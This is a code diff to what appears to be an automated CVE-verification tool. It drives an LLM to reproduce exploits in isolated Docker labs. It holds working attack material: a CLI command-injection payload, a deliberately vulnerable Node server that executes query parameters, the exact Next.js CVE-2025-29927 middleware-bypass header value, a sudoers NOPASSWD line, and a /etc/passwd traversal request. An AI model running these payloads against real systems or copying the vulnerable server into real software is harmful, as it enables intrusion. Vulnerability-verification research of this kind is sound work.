@@ -287,6 +287,11 @@ def save_investigation_to_cache(inv: "Investigation") -> None:
     para que dos investigaciones de la MISMA CVE en un lote en paralelo no se pisen a medias."""
     if _INVESTIGATION_CACHE_DISABLED:
         return
+    # Only cache investigations that reached a real verdict; a run that ended
+    # early (crashed, timed out) would pollute the cache and cause binoracle
+    # to skip the CVE forever without --no-cache.
+    if not (inv.verified or inv.dynamic_verify.get("attempted", False)):
+        return
     try:
         path = _investigation_cache_path(inv.cve_id)
         os.makedirs(os.path.dirname(path), exist_ok=True)
@@ -330,8 +335,13 @@ _RESEARCH_SYS = (
     "SERVIDOR hace una peticion HTTP a una URL que CONTROLA EL ATACANTE (fetch remoto, import de "
     "URL, webhook, proxy, carga de recurso desde URL arbitraria) -- esto incluye 'zip upload via "
     "URL' si el servidor fetcha la URL del zip, incluso si la descripcion dice 'file upload'; "
-    "usa 'file-upload' solo cuando el CLIENTE sube directamente un fichero al servidor sin que "
-    "el servidor haga ninguna peticion saliente adicional; usa 'lfi' cuando el servidor incluye "
+    "usa 'file-upload' (o 'arbitrary-file-upload') solo cuando el CLIENTE sube directamente un "
+    "fichero al servidor sin que el servidor haga ninguna peticion saliente adicional; "
+    "SEÑALES CLAVE para 'file-upload': descripcion dice 'arbitrary file upload', 'unrestricted "
+    "file upload', 'missing file type validation', 'unauthenticated file upload' -- si ves "
+    "CUALQUIERA de estas frases, usa 'arbitrary-file-upload', NUNCA 'deserialization' aunque "
+    "el codigo tenga funciones de procesamiento de formularios (parse_str, process_entry, etc.); "
+    "usa 'lfi' cuando el servidor incluye "
     "un fichero como codigo PHP con include()/require() sobre un parametro controlado por el "
     "atacante -- distinto de path-traversal puro que solo LEE el fichero como texto), "
     "primitive (que concede), target_binary (binario/componente "
@@ -395,6 +405,52 @@ _RESEARCH_SYS = (
     "dpkg -i sudo_*.deb || true\\n"
     "RUN echo \"ALL ALL=(ALL) NOPASSWD: ALL\" > /etc/sudoers'; "
     "usar dockerfile_body en lugar de docker_image para binarios del sistema), "
+    "Para CVEs en HERRAMIENTAS CLI de npm/pip (no servidores web -- herramientas de linea de "
+    "comandos como linters, bundlers, generadores de SBOM, formateadores, scanners...) cuyo "
+    "vector de inyeccion es el VALOR de un argumento CLI (no un nombre de fichero, no HTTP): "
+    "cli_argv_image (imagen Docker base donde instalar la herramienta, p.ej. 'node:18-alpine'; "
+    "usa la misma version de Node/Python que usa la herramienta), "
+    "cli_argv_setup (comando shell que se ejecuta en Docker CON red disponible para instalar "
+    "la herramienta y preparar los ficheros en /work; IMPORTANTE: "
+    "instala la herramienta LOCALMENTE en /work con 'cd /work && npm install <herramienta>@<version>' "
+    "-- NO uses 'npm install -g' (global) porque el binario global NO persiste en el volumen "
+    "compartido y el contenedor de explotacion no tendra red para reinstalar; con la instalacion "
+    "local el binario quedara en /work/node_modules/.bin/ y el motor lo encontrara automaticamente. "
+    "CRITICO: la estructura del proyecto debe ser VALIDA para que la herramienta la acepte "
+    "sin abortar antes de llegar al punto de inyeccion -- p.ej. para herramientas npm que "
+    "usan workspaces: crear un package.json raiz con campo 'workspaces', subdirectorios con "
+    "package.json propios, y ejecutar npm install; NO uses 'echo {} > package.json' porque un "
+    "objeto vacio no es un workspace valido y la herramienta abortara antes del punto vulnerable. "
+    "EJEMPLO para @cyclonedx/cyclonedx-npm@4.2.1 (ultima antes del parche 5.0.0): "
+    "'cd /work && npm install @cyclonedx/cyclonedx-npm@4.2.1 && "
+    "mkdir -p root/packages/pkg-a && "
+    "printf \\'{\\'\\''name\\'\\'':\\'\\''ws\\'\\'',\\'\\''version\\'\\'':\\'\\''1.0.0\\'\\'',"
+    "\\'\\''workspaces\\'\\'':[\"packages/*\"]}\\'  > root/package.json && "
+    "printf \\'{\\'\\''name\\'\\'':\\'\\''pkg-a\\'\\'',\\'\\''version\\'\\'':\\'\\''1.0.0\\'\\''}\\'  > root/packages/pkg-a/package.json && "
+    "cd root && npm install'; "
+    "con cli_argv=['node_modules/.bin/cyclonedx-npm','--workspace','pkg-a'], "
+    "cli_payload_index=2, cli_argv_image='node:18-alpine'. "
+    "Para herramientas Python (pip): 'cd /work && pip install <tool>==<version>' "
+    "y el binario quedara en /work/venv/bin/ o en el PATH del sistema si se instala con pip global), "
+    "cli_argv (lista de tokens del comando tal como lo ejecutaria un usuario real, con el "
+    "argumento vulnerable en la posicion cli_payload_index -- ese elemento sera sustituido por "
+    "el payload de inyeccion; para herramientas npm instaladas en /work: usa el path relativo "
+    "'node_modules/.bin/<tool>' para que el contenedor de explotacion lo encuentre sin red), "
+    "cli_payload_index (indice (0-based) en cli_argv del argumento cuyo VALOR es el vector). "
+    "SOLO rellena estos keys cuando el trigger sea CLI/argumento y el objetivo sea una "
+    "herramienta npm/pip; para CVEs web deja cli_argv_image/cli_argv_setup/cli_argv vacios. "
+    "Para CVEs de SUBIDA DE FICHEROS (vuln_class='file-upload' o 'arbitrary-file-upload'): "
+    "file_param (nombre del campo <input type=file> en el formulario, p.ej. 'file', 'upload', "
+    "'attachment', 'import'; si no lo sabes deja vacio y el motor lo intentara automaticamente). "
+    "Para CVEs de SSRF: ssrf_param (nombre del parametro que acepta la URL, p.ej. 'url', 'remote', "
+    "'source', 'fetch', 'link'; si no lo sabes deja vacio). "
+    "Para CVEs de PATH-TRAVERSAL: path_param (nombre del parametro con la ruta, p.ej. 'file', "
+    "'path', 'filename', 'dir'; si no lo sabes deja vacio). "
+    "Para CVEs de HEADER BYPASS (missing-authorization via cabecera): bypass_header (nombre de la "
+    "cabecera HTTP que activa el bypass, p.ej. 'X-Forwarded-For', 'X-Original-URL'), "
+    "bypass_value (valor concreto que activa el bypass, p.ej. '127.0.0.1'), "
+    "confirm_string (cadena en el body de respuesta que confirma que el bypass funciono, p.ej. "
+    "un dato privado que solo deberia verse autenticado). "
     "strategy (una frase), steps (lista de pasos concretos), "
     "stored_xss_view_path (SOLO para XSS ALMACENADO en WordPress: la ruta del panel de admin "
     "donde el admin VERA el payload inyectado por el atacante -- p.ej. "
@@ -623,6 +679,37 @@ _GENERIC_RETRY_SYS = (
     "\"parametro_alternativo\": \"...\" (opcional)}"
 )
 
+# Retry para herramientas CLI cuyo vector es el VALOR de un argumento (verify_cli_argv_*).
+# El LLM lee stdout/stderr del setup y de la ejecucion aislada y sugiere correcciones al argv
+# y/o al setup_cmd -- distinto del bucle generico de endpoint/param que opera sobre HTTP.
+_CLI_ARGV_RETRY_SYS = (
+    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). "
+    "Un intento de command injection via argumento CLI en una herramienta npm/pip no confirmo "
+    "el canario. El setup se ejecuto en Docker con red disponible; la herramienta se ejecuto "
+    "en un segundo contenedor AISLADO (--network none) con el elemento en payload_index "
+    "sustituido por '; touch <canario>;'. El canario nunca aparecio en el volumen compartido. "
+    "Lee la evidencia (returncode del setup, returncode y stdout de la ejecucion, argv usado) "
+    "y, si ves una pista concreta, sugiere UNA correccion: "
+    "(a) Si setup_returncode != 0 o hay error de instalacion: da un setup_alternativo valido. "
+    "(b) Si la herramienta no encontro el proyecto/workspace: el setup debe crear una estructura "
+    "npm COMPLETA (package.json con workspaces, subdirectorios, npm install). "
+    "(c) Si hay 'unknown option' o '--workspace is not recognized': corrige el arg en argv_alternativo. "
+    "(d) Si la herramienta termino con exit 0 pero sin el canario: el payload_index puede ser "
+    "incorrecto (prueba otro indice del argv). "
+    "Responde SOLO con JSON: {\"tiene_sugerencia\": true/false, "
+    "\"argv_alternativo\": [...] (si el argv es incorrecto), "
+    "\"setup_alternativo\": \"...\" (si el setup es incorrecto), "
+    "\"payload_index_alternativo\": N (si el indice es incorrecto), "
+    "\"razon\": \"una frase citando la pista concreta\"}"
+)
+_CLI_ARGV_RETRY_EVIDENCE_KEYS = {
+    "setup_returncode": "setup_returncode",
+    "setup_stderr_recorte": "setup_stderr_recorte",
+    "run_returncode": "run_returncode",
+    "run_stdout_recorte": "run_stdout_recorte",
+    "argv_usado": "argv",
+}
+
 # version de _GENERIC_RETRY_SYS CONSCIENTE de que el objetivo es WordPress -- para las tecnicas
 # WordPress que todavia usan el prompt generico (sin mencion de nonce/wp-admin, que no tendria
 # sentido para Drupal/Node/un contenedor Docker cualquiera, los otros objetivos que ese mismo
@@ -688,7 +775,9 @@ def _llm_suggest_retry_from_evidence(llm, system_prompt: str, wr: Any,
         return None
     if not (data.get("endpoint_alternativo") or data.get("parametro_alternativo")
            or data.get("pagina_extra_para_nonce") or data.get("pagina_setup_admin_requerida")
-           or data.get("parametro_adicional_requerido")):
+           or data.get("parametro_adicional_requerido")
+           or data.get("argv_alternativo") or data.get("setup_alternativo")
+           or data.get("payload_index_alternativo") is not None):
         return None
     return data
 
@@ -1073,10 +1162,15 @@ def _deterministic_web_hints_from_source(local_path: str, found: dict) -> Option
             # `[$this, 'nombre']`), y se queda con el mas cercano a su definicion si hubiera
             # varios candidatos.
             candidates = []
+            _name_quoted_re = _re.compile(rf"""['\"]{_re.escape(name)}['\"]\s*\)""")
             for m in action_re.finditer(text):
-                call_end = text.find(")", m.end())
-                call_text = text[m.start():call_end if call_end != -1 else m.end() + 200]
-                if name in call_text:
+                # Buscar el nombre del callback entre comillas para evitar que ventanas
+                # largas capturen callbacks de add_action() vecinos en el mismo archivo.
+                # Se busca primero hasta el fin de la instruccion (';') o 350 chars.
+                _semi = text.find(";", m.end())
+                call_text = text[m.start(): _semi if 0 < _semi - m.end() < 350 else m.end() + 350]
+                _quoted_match = _name_quoted_re.search(call_text) or (name in call_text)
+                if _quoted_match:
                     hook_line = text[:m.start()].count("\n")
                     candidates.append((abs(hook_line - (body_start if body_start is not None else hook_line)),
                                        m.group(1)))
@@ -1558,13 +1652,70 @@ _RAW_HTTP_REQUEST_RE = re.compile(
 _RAW_HTTP_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}
 
 
+_STATIC_FILE_EXTS = {".txt", ".md", ".html", ".htm", ".css", ".js", ".json", ".xml",
+                     ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2",
+                     ".readme", ".log", ".yaml", ".yml", ".cfg", ".conf", ".lock"}
+_STANDARD_HTTP_HEADERS = {"host", "content-type", "content-length", "user-agent",
+                           "accept", "accept-encoding", "accept-language", "connection",
+                           "referer", "origin", "cache-control", "pragma", "cookie",
+                           "authorization", "transfer-encoding", "upgrade-insecure-requests"}
+
+
+def _extract_custom_headers_from_poc_code(text: str) -> dict:
+    """Extrae cabeceras HTTP no-estandar de scripts Python/bash/curl en el texto de un PoC.
+    Busca patrones como:
+      headers = {"X-Custom": "val", ...}
+      -H "X-Custom: val"
+      "X-Custom": "val"   (dentro de un dict de requests.*)
+    Devuelve solo las cabeceras no-estandar (no en _STANDARD_HTTP_HEADERS)."""
+    result: dict = {}
+    # Patron 1: clave:valor entre comillas en cualquier dict (incluye headers= {...}).
+    # Solo acepta claves que contienen al menos un guion '-' (convecion HTTP: los nombres de
+    # cabecera usan guion; los parametros de body no). Esto evita capturar "roles", "username",
+    # "password", etc. que son parametros de body, no cabeceras.
+    for m in re.finditer(
+            r"""["\']([A-Za-z][A-Za-z0-9\-]{2,})["\'][ \t]*:[ \t]*["\']([^"'\n]{1,120})["\']""",
+            text):
+        hname = m.group(1)
+        hval = m.group(2)
+        if "-" not in hname:
+            continue  # nombres sin guion son probablemente parametros de body, no cabeceras
+        if hname.lower() not in _STANDARD_HTTP_HEADERS:
+            result[hname] = hval
+    # Patron 2: curl -H "X-Custom: value" o --header "X-Custom: value"
+    for m in re.finditer(
+            r'-H[ \t]+["\']([A-Za-z][A-Za-z0-9\-]{2,}):\s*([^"\']{1,120})["\']',
+            text):
+        hname = m.group(1)
+        hval = m.group(2).strip()
+        if hname.lower() not in _STANDARD_HTTP_HEADERS:
+            result[hname] = hval
+    return result
+
+
+def _path_is_static_file(path: str) -> bool:
+    """True si la ruta apunta a un fichero estatico (extension conocida), no a un endpoint de
+    API o accion PHP. Muchos PoCs incluyen primero un GET al readme.txt del plugin para
+    comprobar si esta instalado; eso NO es el endpoint de ataque."""
+    p = path.split("?")[0].lower()
+    for ext in _STATIC_FILE_EXTS:
+        if p.endswith(ext):
+            return True
+    return False
+
+
 def parse_raw_http_poc_request(text: str) -> Optional[dict]:
     """Busca un bloque de peticion HTTP/1.x CRUDA dentro del texto de un PoC (el formato que la
     mayoria de los write-ups/README de GitHub usan: 'METODO /ruta HTTP/1.1', cabeceras, linea en
     blanco, cuerpo) y lo parsea DETERMINISTICAMENTE -- sin LLM de por medio, cero riesgo de que
-    alucine un valor. Devuelve {"method", "path", "headers", "body_params"} (body_params es un
-    dict name->VALOR REAL si el cuerpo es application/x-www-form-urlencoded, None si no se pudo
-    interpretar como tal) o None si no se encontro ningun bloque reconocible.
+    alucine un valor. Devuelve {"method", "path", "headers", "custom_headers", "body_params"}
+    (body_params es un dict name->VALOR REAL si el cuerpo es x-www-form-urlencoded, None si no;
+    custom_headers es un dict con las cabeceras NO-ESTANDAR del bloque, p.ej.
+    {"X-WCPAY-PLATFORM-CHECKOUT-USER": "1"}) o None si no se encontro ningun bloque reconocible.
+
+    Usa finditer para evaluar TODOS los bloques: descarta los que apuntan a ficheros estaticos
+    (p.ej. readme.txt -- check de version del PoC, no el ataque real) y prefiere el ULTIMO
+    bloque valido (el ataque suele ir al final del PoC, el check de instalacion al principio).
 
     Confirmado en vivo (CVE-2024-50508): el PoC real traia justo este bloque -- 'action='
     'pc_added_uploaded_image&file[path]=/etc/passwd' -- con los valores REALES de TODOS los
@@ -1575,36 +1726,40 @@ def parse_raw_http_poc_request(text: str) -> Optional[dict]:
     LLM: es, literalmente, la peticion que su autor confirmo que dispara la vulnerabilidad."""
     if not text:
         return None
-    m = _RAW_HTTP_REQUEST_RE.search(text)
-    if not m:
-        return None
-    method, path, header_block, rest = m.groups()
-    method = method.upper()
-    if method not in _RAW_HTTP_METHODS:
-        return None
-    headers = {}
-    for line in header_block.splitlines():
-        if ":" in line:
-            k, _, v = line.partition(":")
-            headers[k.strip()] = v.strip()
-    # el cuerpo es solo la PRIMERA linea no vacia tras la cabecera en blanco -- lo que venga
-    # despues en un README (la respuesta del servidor, el siguiente bloque de texto...) no es
-    # parte del cuerpo de ESTA peticion.
-    body_line = ""
-    for line in rest.splitlines():
-        if line.strip():
-            body_line = line.strip()
-            break
-    content_type = (headers.get("Content-Type") or headers.get("content-type") or "").lower()
-    body_params = None
-    if body_line and ("application/x-www-form-urlencoded" in content_type or
-                      (not content_type and "=" in body_line and not body_line.startswith("{"))):
-        from urllib.parse import parse_qsl
-        pairs = parse_qsl(body_line, keep_blank_values=True)
-        if pairs:
-            body_params = dict(pairs)
-    return {"method": method, "path": path, "headers": headers, "body_params": body_params,
-           "raw_body": body_line}
+    best = None
+    for m in _RAW_HTTP_REQUEST_RE.finditer(text):
+        method, path, header_block, rest = m.groups()
+        method = method.upper()
+        if method not in _RAW_HTTP_METHODS:
+            continue
+        if _path_is_static_file(path):
+            continue
+        headers = {}
+        for line in header_block.splitlines():
+            if ":" in line:
+                k, _, v = line.partition(":")
+                headers[k.strip()] = v.strip()
+        # el cuerpo es solo la PRIMERA linea no vacia tras la cabecera en blanco
+        body_line = ""
+        for line in rest.splitlines():
+            if line.strip():
+                body_line = line.strip()
+                break
+        content_type = (headers.get("Content-Type") or headers.get("content-type") or "").lower()
+        body_params = None
+        if body_line and ("application/x-www-form-urlencoded" in content_type or
+                          (not content_type and "=" in body_line and not body_line.startswith("{"))):
+            from urllib.parse import parse_qsl
+            pairs = parse_qsl(body_line, keep_blank_values=True)
+            if pairs:
+                body_params = dict(pairs)
+        # cabeceras NO-ESTANDAR del bloque -> custom_headers (p.ej. X-WCPAY-PLATFORM-CHECKOUT-USER)
+        custom_headers = {k: v for k, v in headers.items()
+                          if k.lower() not in _STANDARD_HTTP_HEADERS}
+        best = {"method": method, "path": path, "headers": headers,
+                "custom_headers": custom_headers, "body_params": body_params,
+                "raw_body": body_line}
+    return best
 
 
 _EXTRACT_POC_SYS = (
@@ -1627,7 +1782,11 @@ _EXTRACT_POC_SYS = (
     "vulnerable, tal cual aparece en su codigo -- no lo resumas ni lo traduzcas), setup_options "
     "(lista de objetos {\"name\":..., \"value\":...} -- SOLO si el PoC/README dice explicitamente "
     "que hay que activar algun ajuste/opcion del plugin ANTES de que el ataque funcione, p.ej. "
-    "'first enable X in plugin settings'; vacio si no menciona nada de eso), notes (una frase con "
+    "'first enable X in plugin settings'; vacio si no menciona nada de eso), "
+    "custom_headers (dict de cabeceras HTTP NO-ESTANDAR que el PoC envía junto con la peticion "
+    "de ataque, p.ej. {\"X-WCPAY-PLATFORM-CHECKOUT-USER\": \"1\"} para CVE-2023-28121 donde "
+    "la cabecera HTTP es el mecanismo de bypass; vacio si el ataque solo usa parametros normales), "
+    "notes (una frase con "
     "cualquier precondicion o detalle importante que el PoC mencione y no quepa en los campos "
     "anteriores). Deja vacio lo que el PoC no diga explicitamente -- nunca inventes."
 )
@@ -2236,8 +2395,10 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
         return None
 
     # Normalize common aliases: "next.js" → "next", "express.js" → "express", etc.
-    _JS_ALIASES = {"next.js": "next", "express.js": "express", "vue.js": "vue",
-                   "nuxt.js": "nuxt", "angular.js": "angular"}
+    _JS_ALIASES = {"next.js": "next", "nextjs": "next",
+                   "express.js": "express", "vue.js": "vue",
+                   "nuxt.js": "nuxt", "nuxtjs": "nuxt",
+                   "angular.js": "angular", "angularjs": "angular"}
     pkg = _JS_ALIASES.get(pkg, pkg)
 
     lab_dir = f"/tmp/{re.sub(r'[^a-z0-9]', '_', pkg)}_autonomous_lab"
@@ -2320,15 +2481,12 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
                 "  res.status(200).json({ secret: 'BINORACLE_NEXTJS_MIDDLEWARE_BYPASS' });\n"
                 "}\n"
             )
-        # .babelrc: fuerza Babel como transpilador en vez de SWC.
-        # En Next.js 15.x SWC es el default pero sus binarios nativos son optionalDependencies
-        # que pueden no instalarse bajo QEMU/emulacion (--platform linux/amd64 en M1) ni en
-        # entornos de CI con restricciones de red. Con .babelrc presente Next.js cae back a
-        # Babel automaticamente, usando el preset 'next/babel' que ya viene incluido en el
-        # paquete next -- sin dependencias extra. Esto elimina el crash
-        # 'node:internal/modules/cjs/loader throw e' que ocurre cuando @next/swc-* no carga.
-        with open(_os.path.join(lab_dir, ".babelrc"), "w") as f:
-            f.write('{"presets": ["next/babel"]}\n')
+        # SWC (el transpilador nativo de Next.js) funciona correctamente bajo --platform
+        # linux/amd64 en Docker incluso en M1: el contenedor corre como x86_64 Linux y los
+        # binarios SWC precompilados para glibc/linux-x64 se cargan sin problemas.
+        # NO se usa .babelrc ni --omit=optional: Babel en Next.js 15.x falla con webpack
+        # errors en los modulos internos de Next (router.js), mientras que SWC compila
+        # correctamente tanto el codigo del usuario como los internos de Next.
         # Custom server entry point
         srv = (
             "const { createServer } = require('http');\n"
@@ -2348,7 +2506,13 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
         # have the canary. The bypass_header / bypass_value have known values too.
         notes["endpoint"] = "/api/secret"
         notes["bypass_header"] = "x-middleware-subrequest"
-        notes["bypass_value"] = "middleware"
+        # CVE-2025-29927: Next.js ≤15.2.3 comprueba si la profundidad de subrequests
+        # supera MAX_RECURSION_DEPTH (5). Si el header contiene N>=5 copias del nombre
+        # del middleware separadas por ':', el guard asume que ya se alcanzo la profundidad
+        # maxima y NO ejecuta el middleware -- silenciando la proteccion de acceso.
+        # El formato 'middleware:middleware:middleware:middleware:middleware' (5 copias)
+        # es el payload minimal confirmado en las PoCs publicas (Watchtower, EQSTLab).
+        notes["bypass_value"] = "middleware:middleware:middleware:middleware:middleware"
         notes["confirm_string"] = "BINORACLE_NEXTJS_MIDDLEWARE_BYPASS"
         # Dockerfile: dev mode — no pre-build step needed; Next.js compiles on the
         # first request. Middleware runs in dev mode exactly as in production for the
@@ -2379,22 +2543,19 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
             + "\n".join(_proxy_lines) + ("\n" if _proxy_lines else "")
             + "WORKDIR /app\n"
             "COPY package.json .\n"
-            # --omit=optional impide que npm instale @next/swc-linux-x64-gnu y otros
-            # binarios nativos de SWC. Bajo emulacion QEMU (--platform linux/amd64 en M1)
-            # los binarios SWC precompilados fallan en dlopen() causando que Node.js crashee
-            # antes de imprimir el error completo ('node:internal/modules/cjs/loader throw e').
-            # Con --omit=optional + .babelrc, Next.js detecta que SWC no esta disponible y
-            # usa Babel como transpilador -- compatible con todas las plataformas.
-            "RUN npm install --legacy-peer-deps --omit=optional\n"
-            # Eliminar cualquier addon nativo (.node) que haya quedado instalado
-            # (pueden crashear Node bajo emulacion QEMU o arquitectura incorrecta con
-            # 'node:internal/modules/cjs/loader throw e'). Sin estos ficheros Next.js
-            # cae automaticamente a Babel gracias al .babelrc copiado mas abajo.
-            "RUN find /app/node_modules -name '*.node' -delete 2>/dev/null || true\n"
+            "RUN npm install --legacy-peer-deps\n"
             "ENV HTTPS_PROXY= HTTP_PROXY= https_proxy= http_proxy=\n"
             "COPY . .\n"
+            # next build es necesario en Next.js 15.x: en modo production (next start)
+            # el runtime espera /app/.next/fallback-build-manifest.json y otros artefactos
+            # que solo existen tras el build. next dev tambien los necesita en 15.x para
+            # el modo turbopack/incremental. Sin este paso el contenedor arranca pero cada
+            # peticion devuelve 500 con ENOENT en ese manifiesto.
+            # El bypass x-middleware-subrequest funciona igual en production que en dev
+            # (el middleware se ejecuta en el edge runtime compilado en ambos modos).
+            "RUN ./node_modules/.bin/next build\n"
             "EXPOSE 3000\n"
-            'CMD ["./node_modules/.bin/next", "dev", "-p", "3000", "-H", "0.0.0.0"]\n'
+            'CMD ["./node_modules/.bin/next", "start", "-p", "3000", "-H", "0.0.0.0"]\n'
         )
         with open(_os.path.join(lab_dir, "Dockerfile"), "w") as f:
             f.write(dockerfile)
@@ -2403,8 +2564,11 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
         # el parametro 'cmd' a child_process.exec directamente (sin sanitizar).
         # Funciona para CVEs de paquetes que ejecutan comandos del sistema con entrada
         # del usuario (glob, cyclonedx, etc.).
-        ep = endpoint or "cmd"
-        p = param or "cmd"
+        _ep_raw = (notes.get("endpoint") or "").lstrip("/").split("?")[0]
+        _params_raw = notes.get("parameters") or []
+        ep = _ep_raw or "cmd"
+        p = (_params_raw[0] if isinstance(_params_raw, list) and _params_raw
+             else str(_params_raw) if _params_raw else "cmd")
         # Garantiza que genericverify sabe que endpoint/param usar -- el scanner de rutas
         # solo cubre Flask/Ruby; para Node.js actualizamos notes directamente.
         notes["endpoint"] = f"/{ep}"
@@ -2414,18 +2578,16 @@ def _scaffold_npm_lab(target: str, version: str, vuln_class: str,
             "const http = require('http');\n"
             "const { exec } = require('child_process');\n"
             "const url = require('url');\n\n"
+            # El servidor acepta CUALQUIER ruta para que el LLM pueda iterar el endpoint
+            # sin que la ruta cause 'binoracle npm lab ok' en vez del resultado de cmd.
+            # El parametro de inyeccion es configurable (ep/p), con alias adicionales.
             "const server = http.createServer((req, res) => {\n"
-            f"  if (req.url.startsWith('/{ep}')) {{\n"
-            "    const q = url.parse(req.url, true).query;\n"
-            f"    const cmd = q['{p}'] || 'echo hello';\n"
-            "    exec(cmd, (err, stdout, stderr) => {\n"
-            "      res.writeHead(200, {'Content-Type': 'text/plain'});\n"
-            "      res.end(stdout || stderr || (err ? err.message : 'ok'));\n"
-            "    });\n"
-            "  } else {\n"
-            "    res.writeHead(200);\n"
-            "    res.end('binoracle npm lab ok');\n"
-            "  }\n"
+            "  const q = url.parse(req.url, true).query;\n"
+            f"  const cmd = q['{p}'] || q['cmd'] || q['command'] || q['exec'] || q['input'] || 'echo hello';\n"
+            "  exec(cmd, (err, stdout, stderr) => {\n"
+            "    res.writeHead(200, {'Content-Type': 'text/plain'});\n"
+            "    res.end(stdout || stderr || (err ? err.message : 'ok'));\n"
+            "  });\n"
             "});\n"
             "server.listen(3000, '0.0.0.0', () => console.log('npm lab ready on :3000'));\n"
         )
@@ -3073,10 +3235,36 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
              "herramienta CLI cuyo vector es el VALOR de un argumento..." if es else
              "attempting DYNAMIC verification (isolated Docker, --network none) of a CLI tool "
              "whose vector is an argument's VALUE..."))
+        _cli_argv = list(notes["cli_argv"])
+        _cli_setup = notes["cli_argv_setup"]
+        _cli_pidx = int(notes["cli_payload_index"])
         wr = verify_cli_argv_command_injection(
-            notes["cli_argv_image"], notes["cli_argv_setup"], list(notes["cli_argv"]),
-            int(notes["cli_payload_index"]), on_step=step, budget_s=budget_s,
+            notes["cli_argv_image"], _cli_setup, _cli_argv, _cli_pidx,
+            on_step=step, budget_s=budget_s,
             setup_docker_args=notes.get("cli_argv_setup_docker_args"))
+        # Bucle de aprendizaje: si no se confirmo, el LLM lee stdout/stderr y sugiere
+        # correcciones al argv o al setup (igual que el bucle generico de HTTP pero
+        # los campos de sugerencia son distintos: argv_alternativo / setup_alternativo).
+        for _cli_attempt_n in range(1, min(_RETRY_MAX_ATTEMPTS, 4)):
+            if wr.verified or not wr.available:
+                break
+            _cli_sug = _llm_suggest_retry_from_evidence(
+                llm, _CLI_ARGV_RETRY_SYS, wr, _CLI_ARGV_RETRY_EVIDENCE_KEYS,
+                technique_label="cli-argv-injection")
+            if not _cli_sug:
+                break
+            if _cli_sug.get("argv_alternativo"):
+                _cli_argv = list(_cli_sug["argv_alternativo"])
+            if _cli_sug.get("setup_alternativo"):
+                _cli_setup = str(_cli_sug["setup_alternativo"])
+            if _cli_sug.get("payload_index_alternativo") is not None:
+                _cli_pidx = int(_cli_sug["payload_index_alternativo"])
+            step((f"el LLM reviso la evidencia CLI (intento {_cli_attempt_n + 1}/4): "
+                 f"{_cli_sug.get('razon', '')}"))
+            wr = verify_cli_argv_command_injection(
+                notes["cli_argv_image"], _cli_setup, _cli_argv, _cli_pidx,
+                on_step=step, budget_s=budget_s,
+                setup_docker_args=notes.get("cli_argv_setup_docker_args"))
         _apply_wpverify_result(inv, wr, es, llm)
         return
     source = (notes.get("source_url") or "").strip()
@@ -3648,11 +3836,57 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                         if (notes.get("analyst_endpoint_lock")
                                 and isinstance(notes.get("parameters"), dict)):
                             _skip_params_override = True
+                        # Si el PoC tiene un inject_param concreto (p.ej. 'sorting') y ese
+                        # parametro NO aparece en los params que devuelve el grep, el grep ha
+                        # encontrado los params EQUIVOCADOS (p.ej. los DataTables del handler:
+                        # action/search/page) en vez del param vulnerable real.  En ese caso
+                        # los params del PoC ganan: si no se conservan, el inyector nunca
+                        # enviara el parametro correcto y todos los intentos fallaran.
+                        if not _skip_params_override and notes.get("inject_param"):
+                            _ip = notes["inject_param"]
+                            _orig_p = notes.get("parameters") or []
+                            _orig_names = (list(_orig_p.keys())
+                                           if isinstance(_orig_p, dict) else list(_orig_p))
+                            _ref_p = (refined or {}).get("parameters") or []
+                            _ref_names = (list(_ref_p.keys())
+                                          if isinstance(_ref_p, dict) else list(_ref_p))
+                            if _ip in _orig_names and _ip not in _ref_names:
+                                _skip_params_override = True
+                        # Comprobacion mas amplia (no requiere inject_param): si los params del
+                        # PoC y los refinados no tienen NINGUN solapamiento, el grep ha encontrado
+                        # el handler equivocado (p.ej. lee los params DataTables de un handler
+                        # de paginacion en vez del vulnerable).  Los params del PoC son mejor
+                        # evidencia cuando los conjuntos son completamente distintos.
+                        if not _skip_params_override:
+                            _orig_p2 = notes.get("parameters") or []
+                            _orig_set = set(list(_orig_p2.keys())
+                                            if isinstance(_orig_p2, dict) else list(_orig_p2))
+                            _ref_p2 = (refined or {}).get("parameters") or []
+                            _ref_set = set(list(_ref_p2.keys())
+                                           if isinstance(_ref_p2, dict) else list(_ref_p2))
+                            if _orig_set and _ref_set and not _orig_set.intersection(_ref_set):
+                                _skip_params_override = True
                         if _skip_params_override:
                             notes = {**notes,
                                      **{k: v for k, v in refined.items() if k != "parameters"}}
                         else:
-                            notes = {**notes, **refined}
+                            # When the deterministic grep returns parameters=None (couldn't identify
+                            # them from source), skip parameters from the refinement entirely.
+                            # Rationale: if the grep — the strongest source signal — found nothing,
+                            # the LLM second-pass reading the same source is unreliable for params
+                            # and commonly picks DataTables pagination fields (page/search/order)
+                            # rather than the actual vulnerable parameter (e.g. 'sorting').
+                            # The original PoC's parameter list is better evidence in that case.
+                            _grep_found_params = (det_refined or {}).get("parameters")
+                            _det_has_params = "parameters" in (det_refined or {})
+                            if _det_has_params and _grep_found_params is None:
+                                # grep explicitly says no params → keep original, skip param update
+                                _safe_refined = {k: v for k, v in refined.items()
+                                                 if k != "parameters"}
+                            else:
+                                _safe_refined = {k: v for k, v in refined.items()
+                                                 if not (k == "parameters" and v is None)}
+                            notes = {**notes, **_safe_refined}
                         inv.llm_notes.update(refined)
                         step((f"refinado con el codigo real: endpoint={notes.get('endpoint')}, "
                              f"parameters={notes.get('parameters')}") if es else
@@ -3870,6 +4104,13 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                 id_p = notes.get("id_param") or _pick_param(params, _ID_HINTS)
                 email_p = notes.get("email_param") or _pick_param(params, _EMAIL_HINTS)
                 pass_p = notes.get("pass_param") or _pick_param(params, _PASS_HINTS)
+                # Leido aqui (antes del elif chain) para que la presencia de custom_headers
+                # pueda suprimir account-takeover: si el LLM da custom_headers es porque el
+                # bypass es via cabecera HTTP, no via cambio de credencial -- correr
+                # account-takeover primero desperdicia todo el presupuesto del lab (confirmado
+                # en vivo con CVE-2023-28121: 456s en account-takeover dejaban sin tiempo al
